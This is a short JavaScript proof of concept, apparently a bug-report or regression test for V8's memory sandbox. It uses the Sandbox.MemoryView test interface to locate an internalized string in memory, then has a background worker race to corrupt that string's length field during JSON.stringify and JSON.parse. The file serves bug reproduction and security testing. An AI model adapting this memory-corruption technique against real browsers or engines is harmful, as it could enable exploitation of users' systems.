let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function corruptInBackground(address, valueA, valueB) {
    function workerTemplate(address, valueA, valueB) {
        let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        while (true) {
            memory.setUint32(address, valueB, true);
            memory.setUint32(address, valueB, true);
            memory.setUint32(address, valueB, true);
            memory.setUint32(address, valueA, true);
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address}, ${valueA}, ${valueB})`);
    return new Worker(workerCode, { type: 'function' });
}

function f0() {
    const o3 = {
        [-2.0]: 652590.8400089946,
    };

    start_addr = 0x199000;
    while (true) {
        let v1 = sbx_memory.getUint32(start_addr, true);
        let v2 = sbx_memory.getUint32(start_addr + 4, true);
        let v3 = sbx_memory.getUint32(start_addr + 8, true);
        // look for the internalized string's length field
        if (v1 == 0x00000155 && v2 == 0x25341572 && v3 == 0x2) {
            print("found: 0x" + start_addr.toString(16));
            break;
        }
        start_addr += 1;
    }
    let worker = corruptInBackground(start_addr + 8, 0xfffffffd, 0x2);

    return o3;
}
const v4 = [1000000000.0,98518.52636175626,2.1501572133963123,3.0,-1000.0,-1.0];
v4.toJSON = f0;
const v6 = Array(v4);
v6[6] = v4;
JSON.parse(JSON.stringify(v6));
